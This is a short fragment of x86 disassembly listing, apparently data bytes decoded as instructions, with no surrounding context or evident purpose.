  428eb5:	mov    WORD PTR [edx],es
  428eb7:	add    BYTE PTR [esi],ch
  428eb9:	mov    WORD PTR [edx],es
  428ebb:	add    BYTE PTR [esp+ecx*4+0x2],al
  428ebf:	add    BYTE PTR [esp+ecx*4+0x2],dl
  428ec3:	add    BYTE PTR [esp+ecx*4+0x2],ah
  428ec7:	add    BYTE PTR [esp+ecx*4+0x2],dh
  428ecb:	add    BYTE PTR [edx-0x65fffd74],al
  428ed1:	mov    WORD PTR [edx],es
  428ed3:	add    BYTE PTR [esp+ecx*4-0x734ffffe],ah
  428eda:	add    al,BYTE PTR [eax]
  428edc:	mov    esi,0x28c
  428ee1:	add    BYTE PTR [eax],al
	...
